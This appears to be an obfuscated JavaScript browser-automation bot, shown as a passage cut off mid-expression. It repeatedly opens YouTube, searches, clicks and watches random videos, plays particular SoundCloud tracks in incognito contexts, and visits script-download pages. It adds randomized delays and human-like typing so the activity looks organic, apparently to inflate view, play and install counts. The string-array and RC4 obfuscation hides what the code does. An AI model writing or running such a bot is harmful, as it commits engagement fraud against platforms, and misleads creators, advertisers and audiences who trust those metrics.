function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x7 * -0x324 + 0x296 * -0x2 + 0x1b28);
    let h = e[f];
    return h;
  }, d(b, c);
}
const W = c,
  V = b,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xdf3 + -0x50 + 0xe44))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x20b0 + -0xe5b + -0x1255), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xe994 + -0x7946 + 0x1 * 0x1d80a + (0x1 * 0x57b9 + -0x67b7 + -0x4a96 * -0x1) * random()) : await standardWaitForNetIdle(f), await wait(0x1441 + 0x9ea * 0x2 + -0x1 * 0x148d + (0x29ca * 0x1 + 0x24f0 + 0x2 * -0x13d5) * random()), 0xd1f * -0x1 + 0x11 * -0x1d9 + 0x2c89;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x55d * -0x1 + 0x31c * -0x2 + 0x1f1d), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x807 + -0xd * 0x1c0 + 0xeba;
}
async function randomWait() {
  return await wait(-0x1704 + -0x108f + 0x3b1b * 0x1 + (0x1f57 * 0x1 + 0x215c + -0x1 * 0x2d2b) * random()), -0x4 * 0x6f1 + 0x4d3 + 0x59 * 0x42;
}

function a() {
  const bk = [
    'e/mope.io',
    'CwLrqtvWv1DsDa',
    'BwvUDc5PBM5LCG',
    'ility-mod',
    '05725b&utm',
    'B2XZlxLVDs1ZAa',
    'ger-js-6cf',
    'https://gr',
    'WP4wiCoZzq',
    'zw51C2vYANmUBW',
    'pts/by-sit',
    'easyfork.o',
    'mcaOv2LUzg93CW',
    'zwfZEwzVCMSUBW',
    'W7dcMaWGamk9WPpdGmo7qW',
    '-hcaptcha-',
    't,minecraf',
    'm0bSWPOyCmotmWRcVG',
    'rLPzfs7dOuqeW4Tw',
    'document.d',
    'WQGiWRBdU8k0WO5GW4fkAW',
    'aSolW4ldHHxcTb3cOCopW6m',
    'WRpdLCkBWQWvmmocWO0XuG',
    'WRZcLqS9dCoHW4RdLmoZrG',
    'jLxdGrJdUN1zW5xcM2y',
    'e-capital-'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x6df + 0xd0a + -0x1 * 0x62b, -0x2 * -0xbe + -0x166b + -0x1 * -0x14f6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x87ce + 0xaf * 0x3e + -0x3830 * -0x1) * getRandomInt(-0x2b * 0xca + 0xebc + -0x2 * -0x99a, 0xaaa + 0x3e5 * 0x7 + -0x2 * 0x12f4), h)), 0x2b8 + 0xd * -0x26e + 0x1cdf;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x131b + -0x81f + 0x1b3a;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0xdcc * -0x2 + -0x1bc2 + 0x2b]['split']('\x20');
    for (let k = 0x1 * -0x11f + -0x1c4c + -0x1 * -0x1d6b; k < i['length']; k += 0x1426 + -0xb55 * -0x1 + -0x1f79)
      j += i[k] * h[i[k + (-0x1708 + 0xa2f * 0x1 + 0xcda)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x7 * -0x324 + 0x296 * -0x2 + 0x1b28);
    let h = e[f];
    if (b['YqKDYl'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x17d6 + 0xaf8 + -0x44a * -0x3, s, t, u = -0x224e + 0x2b1 + -0x1 * -0x1f9d; t = n['charAt'](u++); ~t && (s = r % (-0x50 + -0x1702 + -0x1d * -0xce) ? s * (-0x66b + -0xd0 + 0x77b) + t : t, r++ % (0x1 * -0xc9e + -0x68 * 0x2 + 0x1 * 0xd72)) ? p += String['fromCharCode'](-0x1356 + 0x137 * 0x3 + 0x10b0 & s >> (-(-0x3 * -0x86d + 0xa * 0x3a1 + 0x1485 * -0x3) * r & -0x1c * 0x114 + 0x8a3 + 0x1593 * 0x1)) : 0x147d + 0xd78 + -0x21f5) {
          t = o['indexOf'](t);
        }
        for (let v = 0x70b * 0x2 + 0x1b7b + -0xddb * 0x3, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x2164 + 0x184f + 0x925))['slice'](-(-0x108f + 0x847 * -0x1 + 0x4f8 * 0x5));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x2475 + -0x5 * -0x776 + -0x49c3,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x4d3 + 0x1702 + 0x5f * -0x4b; u < -0x6df + 0xd0a + -0x3 * 0x1b9; u++) {
          p[u] = u;
        }
        for (u = -0x2 * -0xbe + -0x166b + -0x1 * -0x14ef; u < 0xb51 + 0x71 * 0x8 + -0xdd9 * 0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x2b * 0xca + 0xebc + -0xa * -0x205), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0xaaa + 0x3e5 * 0x7 + -0x7 * 0x56b, q = 0x2b8 + 0xd * -0x26e + 0x1cde;
        for (let v = -0x131b + -0x81f + 0x1b3a; v < n['length']; v++) {
          u = (u + (-0xdcc * -0x2 + -0x1bc2 + 0x2b)) % (0x1 * -0x11f + -0x1c4c + -0x1 * -0x1e6b), q = (q + p[u]) % (0x1426 + -0xb55 * -0x1 + -0x1e7b), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1708 + 0xa2f * 0x1 + 0xdd9)]);
        }
        return t;
      };
      b['xgWAWh'] = m, c = arguments, b['YqKDYl'] = !![];
    }
    const j = e[-0x2 * -0xcb9 + 0x9 * -0x277 + -0x343],
      k = f + j,
      l = c[k];
    return !l ? (b['jzWNQA'] === undefined && (b['jzWNQA'] = !![]), h = b['xgWAWh'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2 * -0xcb9 + 0x9 * -0x277 + -0x33d)['map'](l => Array['from'](l['children']))['flat'](-0x1c5a + 0x26 * 0xda + 0x5 * -0xcd)['map'](l => l['childNodes'][0x4 * 0x78b + -0x5bf * -0x2 + 0x2d * -0xed]['childNodes'][0x24 * -0x10a + 0x247 + 0x17 * 0x187]['childNodes'][0xfb * -0x23 + -0x2 * -0x2f5 + -0x1 * -0x1c68]['childNodes'][0x1 * -0x36f + -0xd0b * -0x1 + -0x99c]['childNodes'][0x13f3 + 0x311 * 0x2 + -0x1a14]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1ffe + 0x85e + 0x1b88, -0x2a3 + -0x1ce * -0x7 + 0x989 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1b4 * 0x2d + -0x1de3 + 0xa51f);
  const h = await getMaxTime(f),
    i = Math['min']((0x607 * 0x1e + 0x1432d + -0x10d9f) * getRandomInt(-0x1160 + 0xeff + 0x263, -0xffc + 0x18a2 + -0x2f * 0x2f), h);
  return await wait(i), -0x161 * 0x12 + -0x1bd3 * 0x1 + 0x34a6;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x18b7 + -0xbc5 * 0x2 + -0xb * -0x463]['children'][-0x2 * 0x117b + 0x1416 + 0xee0]['children'][-0x3e1 + 0x69c + -0x2bb]['children'][0x1e11 + 0x2443 + -0x4254]['children'][0xa * 0x73 + 0x367 * 0x2 + -0xb4c]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x28e * -0x2 + -0x7c * -0x44 + 0x1 * -0x1bd3;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x7 * -0x324 + 0x296 * -0x2 + 0x1b28);
    let h = e[f];
    if (c['rulaQo'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x17d6 + 0xaf8 + -0x44a * -0x3, r, s, t = -0x224e + 0x2b1 + -0x1 * -0x1f9d; s = m['charAt'](t++); ~s && (r = q % (-0x50 + -0x1702 + -0x1d * -0xce) ? r * (-0x66b + -0xd0 + 0x77b) + s : s, q++ % (0x1 * -0xc9e + -0x68 * 0x2 + 0x1 * 0xd72)) ? o += String['fromCharCode'](-0x1356 + 0x137 * 0x3 + 0x10b0 & r >> (-(-0x3 * -0x86d + 0xa * 0x3a1 + 0x1485 * -0x3) * q & -0x1c * 0x114 + 0x8a3 + 0x1593 * 0x1)) : 0x147d + 0xd78 + -0x21f5) {
          s = n['indexOf'](s);
        }
        for (let u = 0x70b * 0x2 + 0x1b7b + -0xddb * 0x3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x2164 + 0x184f + 0x925))['slice'](-(-0x108f + 0x847 * -0x1 + 0x4f8 * 0x5));
        }
        return decodeURIComponent(p);
      };
      c['igTlCD'] = i, b = arguments, c['rulaQo'] = !![];
    }
    const j = e[0x2475 + -0x5 * -0x776 + -0x49c3],
      k = f + j,
      l = b[k];
    return !l ? (h = c['igTlCD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x2031 + 0x13 * -0x194 + -0x3e91 * -0x1 + (-0xe * -0x27a + 0x20f1 + -0x1679 * 0x3) * random()
  }), await wait(-0x7 * -0xca + -0x254b * 0x1 + 0x21b9 + (0x53e + -0x29 * -0x72 + -0x1654) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xb + 0x1c + 0x1 * -0xf]['childNodes'][-0x19b2 + -0x1f * -0x43 + -0x2 * -0x8cb]['childNodes'][-0x13d * -0x4 + 0x8a3 * -0x1 + 0xec * 0x4]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1af * -0x8 + 0x4 * 0x1eb + -0x1 * -0x5d1]['childNodes'][0x24ed + 0x1aeb + -0x2a9 * 0x18]['childNodes'][-0x14 * 0x1c4 + -0xff2 + 0x3344]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1bb9 + -0x1a0a + 0x35c4),
          r = -0xd47 + -0x8 * -0x45c + -0x1599 * 0x1;
        for (let u = -0x224 * -0x3 + 0x1f6 + -0x3a * 0x25; u < q['length']; u += -0x2 * 0x3fd + -0x2c * 0xbf + 0x28d0)
          r += q[u] * k[q[u + (-0x2 * 0x1a5 + -0x14fd + -0x128 * -0x15)]];
        return r;
      }(n);
  });
  await wait((-0x3fa1 + 0x26e * 0x2f + 0x807) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x67 * -0x22e + 0xf63f + -0xec61) * getRandomInt(-0x1b7d * 0x1 + 0x6 * -0x124 + -0x5 * -0x6de, 0x122b + -0x26b2 * -0x1 + 0xd * -0x45f), h + (-0x5e7 * 0x2 + 0x19ba + 0x2 * 0x2ce));
  return await wait(i), -0x888 + -0x1 * -0x1df5 + -0x156c;
}
async function keyWatch(f) {
  const R = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x167 * -0x2 + -0x39f + -0x13 * -0xb), log('clicking..' + '.'), await f[R(0x8, 'vW*(')]('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x17ab + -0xa4a * -0x1 + 0x1919 + (0x1 * -0xed + 0x4a0 + -0x1 * -0x35) * Math['random']());
    });
  }, -0x8 * -0x51a + 0x1eb * -0x16 + 0x1 * 0x1cba);
  await wait(0x2d4fc + 0x8cd11 + -0x70e2d);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3247 * -0x2 + -0x1180c + 0x266fa) * getRandomInt(0x1 * -0xaf7 + 0xa0f + 0xec * 0x1, -0x827 + -0x19d7 + 0x2217)), clearInterval(h), -0x7 * -0x3e9 + -0x2330 + 0x7d2;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x89c + 0x1 * 0x1ffa + -0x175e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1135 * -0x1 + -0x129f * 0x2 + 0x9 * 0x23a;
    await randomWait();
  }
  return 0x17b4 + -0x4b3 + -0x1300;
}

function fetchRandomSC() {
  const S = d;
  return Math['random']() <= -0x25f5 + 0x11e4 + 0x1 * 0x1411 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x3c2 + -0x1 * -0x19e9 + -0x1627 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + S(0x4) + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x103e + -0x1 * -0x20f1 + -0x10b3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x125e + -0x571 * 0x4 + 0x1411 * 0x2;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = b;
          let n = document['querySelec' + 'tor']('#content\x20>' + T(0x17, 'e213') + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2 * -0x58f1 + -0x34ad + 0x3293 + getRandomInt(0xa44 + 0x3d55 + -0x1 * 0xd01, -0x10f7 + -0x13 * 0x7b1 + 0x1184a));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x232b + -0xf4a + 0x3276), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x26 * -0x25 + -0x3f * -0x9a + -0x2068;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1613 + 0x3 * -0x761 + 0x10, -0x1f * -0xbf + -0xbb9 + -0xb36)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x394 * -0x3 + 0x9a8 * -0x2 + 0x1 * 0x25dc + floor((-0x5cd + 0x110f + -0x75a * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x419450d0 + 0xb62cbad0 + -0x77c10ba0),
          -0x41ed12 + 0x17 * 0x3d9e5 + 0x69597f,
          0x663b + -0xfdd6 + 0x1179b,
          0x1a86 + -0x503 * -0x1 + -0x23 * 0xe3
        ], y = [
          -0x1 * -0x1dc3 + -0x3 * -0xbcb + 0x4 * -0x1043,
          0x1721 + -0xe9f + -0x872,
          0x1c4a * -0x1 + 0x263d + 0x9eb * -0x1,
          -0x1be8 + 0x6a + 0x1b7e
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x991 * 0x2 + 0x1c2b * -0x1 + 0x5 * 0x976)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2662 + 0x24a8 + 0xdd * 0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x7 * 0x501 + 0x2689 + -0x382) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1fb8 + 0x1ed * -0x9 + -0xe63] = A[0x176d + 0xb17 + -0x2274] = A[0x3 * 0x823 + -0xaa0 + 0x1b9 * -0x8] = A[-0xa7 * -0x24 + -0x2510 + 0x2f * 0x4a] = A[0x17a4 + -0x67 * -0x4c + -0x3635] = A[-0x1 * -0x2f9 + 0x83 * 0xe + -0xa1f * 0x1] = A[-0x679 + -0x1f33 + -0x1 * -0x25b1] = A[0x1 * -0xd8d + 0x8a5 + 0x4ee] = A[-0x533 + -0x83 * 0x2f + -0x5 * -0x5db] = A[0x15b + -0x9ec + -0x47 * -0x1f] = A[-0x1 * 0x1467 + -0x11e3 + -0x2653 * -0x1] = A[-0x20c8 + -0x2598 + 0x2 * 0x2335] = A[-0xef1 + -0x67a * 0x5 + 0x2f5e] = A[0x10ba * 0x2 + 0xe69 + -0x2fd1] = A[-0x97d * 0x2 + -0x1ac0 + -0x1 * -0x2dc7] = A[0x901 + 0x2025 + 0x20e * -0x14] = A[0x67 + 0xfe4 + -0x103c] = 0x14bd + 0xb * -0x17 + -0x13c0 * 0x1, this['blocks'] = A) : this['blocks'] = [
                0x3 * 0x3ec + -0x910 + -0x2b4,
                0x3 * -0xbf5 + -0x1 * -0x118c + -0x1 * -0x1253,
                0xc8b + -0x1 * 0xbf1 + -0x9a,
                0x26e4 + 0x9 * 0x2f5 + -0x4181,
                0x204e + 0x1 * 0x2ab + 0x7 * -0x4ff,
                0x16f8 + 0x9aa + 0x1051 * -0x2,
                0x1238 + 0x1 * 0xcea + 0x63a * -0x5,
                0x2 * 0x637 + 0xbf * -0x34 + -0x546 * -0x5,
                -0x10cb + 0x1 * 0x20c8 + -0xffd,
                -0x1b1 * 0x5 + -0x1c03 + 0x2478,
                -0x26fa + -0x17ff + -0x1 * -0x3ef9,
                0x29d + -0x1 * -0x827 + -0xac4,
                0xbc * 0xe + 0x114d + -0x1b95,
                -0x1f * -0xa7 + -0x2 * -0x24a + 0x7 * -0x38b,
                -0x1993 * 0x1 + 0x8b * -0x1d + -0xdc6 * -0x3,
                0x1815 + -0x1309 + -0x50c,
                -0x1 * -0x19dd + -0x1c23 + 0x246
              ], this['h0'] = -0x5d0b71b8 + -0x8cf8c27 * 0xb + 0x2 * 0x929dcd33, this['h1'] = 0x1a5 * -0x6320b + -0x1b405a892 * 0x1 + 0x1 * 0x2ae03a032, this['h2'] = -0x55 * -0x29bc241 + 0x140f5 * 0x5d55 + -0xba0034f0, this['h3'] = 0x1 * -0xfb53bce + 0x1888e32 + 0x1e5f0212, this['h4'] = 0xc8dcd071 + 0x8070d84d + -0x857ac6ce, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xb30 * -0x1 + 0x209a + -0x2bca, this['finalized'] = this['hashed'] = -0x1 * -0x2113 + 0x81d + -0x4 * 0xa4c, this['first'] = 0x7 * -0xd1 + -0xfd4 + 0x2 * 0xac6;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x132d + -0x1 * -0x15ab + -0x28d8, O = J['length'] || -0x1343 + -0x1 * 0xa03 + 0x4e1 * 0x6, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xb7b + -0x2015 * -0x1 + -0xae4 * 0x4, P[0x30b * 0xb + 0x3 * 0xcbf + -0x47b6] = this['block'], P[-0x1682 + -0x19ed + 0x307f] = P[-0x1a * 0x23 + 0x1 * 0xa6d + -0x6de] = P[0x9d * 0x15 + -0x2443 + 0x1764] = P[-0x2 * 0xdfd + 0x17dd + -0x30 * -0x16] = P[0x1f35 + 0x22d7 + -0x4208] = P[0x6 * -0xbc + 0x4 * -0x797 + 0x22c9 * 0x1] = P[-0xbf * -0x2c + 0x14c * -0x4 + -0x1b9e] = P[0x4f3 * 0x7 + 0x25d9 * 0x1 + -0x4877] = P[0x11 * 0x1c9 + -0x26fd + -0x456 * -0x2] = P[0x1a8 * 0x7 + -0x165e + 0xacf] = P[-0x35c * 0xa + 0x1a65 + 0x73d] = P[-0x1c37 * -0x1 + -0x47c + -0x17b0] = P[-0x1e8c + 0x57c + 0x191c] = P[0x2547 + 0x157d + -0x3ab7] = P[-0xb8e + 0xd3a + 0x12 * -0x17] = P[0x83 * 0x11 + -0x1 * -0x2669 + 0x3 * -0xfaf] = -0xa76 * 0x1 + 0xb * 0x28e + -0x11a4), K) {
                    for (N = this['start']; M < O && N < -0x1 * -0x1db + -0x89b + 0x700; ++M)
                      P[N >> -0xf23 + 0x1c6 * 0x13 + -0x128d] |= J[M] << y[-0x51f * 0x3 + 0xe03 * 0x2 + -0xca6 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1d20 + 0x21e9 + 0x2b * -0x1b; ++M)
                      (L = J['charCodeAt'](M)) < -0x22d * -0x1 + 0x255 * -0x6 + -0xc51 * -0x1 ? P[N >> -0x1a6b * 0x1 + -0x1 * -0x259a + -0xb2d] |= L << y[0x17d4 + 0x17eb + 0x14 * -0x263 & N++] : L < 0x4 * -0x47c + 0x122c * -0x1 + 0xeb4 * 0x3 ? (P[N >> 0x827 + -0x698 + -0x18d * 0x1] |= (-0x1 * -0x1bfa + -0x1 * -0x669 + -0x21a3 | L >> 0x175f + -0x147a + 0x7 * -0x69) << y[-0x19c8 + 0xf10 + 0xabb & N++], P[N >> -0x233d + 0x1 * -0x1f99 + 0x42d8] |= (-0x4b6 + -0x2045 + 0x257b | -0x60 * -0x5f + -0x82c + 0x3e3 * -0x7 & L) << y[-0x197f * 0x1 + -0x1 * -0x1e79 + -0x4f7 & N++]) : L < -0x69 * 0x328 + 0x1 * -0x2322 + 0x2468a || L >= -0x281 * -0x1 + 0x529 * -0x1 + 0xe2a8 ? (P[N >> -0xf23 + -0xa21 * 0x1 + 0xca3 * 0x2] |= (-0x2061 + -0x241a + 0x455b | L >> -0x317 * 0x8 + 0x1962 + -0x9e) << y[0x3 * -0x26b + -0xc5d + -0x19 * -0xc9 & N++], P[N >> 0x1624 + -0x103e + -0x3a * 0x1a] |= (0x1b1 * 0x12 + 0x122 * -0x13 + -0x62 * 0x16 | L >> -0x1 * -0x2653 + 0x39a * -0x1 + -0x1 * 0x22b3 & 0x2f * -0x9d + 0x2562 + 0x850 * -0x1) << y[-0x220e + -0x1 * 0x83 + -0x2 * -0x114a & N++], P[N >> 0x14ec + -0x24db + 0x173 * 0xb] |= (0x1 * 0x177b + -0xcf * 0x2b + -0x1f7 * -0x6 | -0x8 * -0x2bb + 0x5ce * -0x5 + 0x76d & L) << y[-0xed + 0x1e8 * -0x2 + 0x4c0 & N++]) : (L = -0xc362 + -0x1 * 0x1f2a1 + 0x3b603 * 0x1 + ((0xcc0 + -0x9 * -0x1b + -0x26d * 0x4 & L) << -0x1 * -0x119 + 0xe26 * -0x2 + -0x1b3d * -0x1 | 0x422 * 0x2 + 0x217 * 0x6 + -0x10cf * 0x1 & J['charCodeAt'](++M)), P[N >> -0x375 + -0x2 * 0x117e + 0xcd1 * 0x3] |= (-0x202b + -0x6fd * 0x3 + 0x3612 | L >> 0x260c + -0x193a + -0xcc0) << y[-0x1d91 + 0x125a + 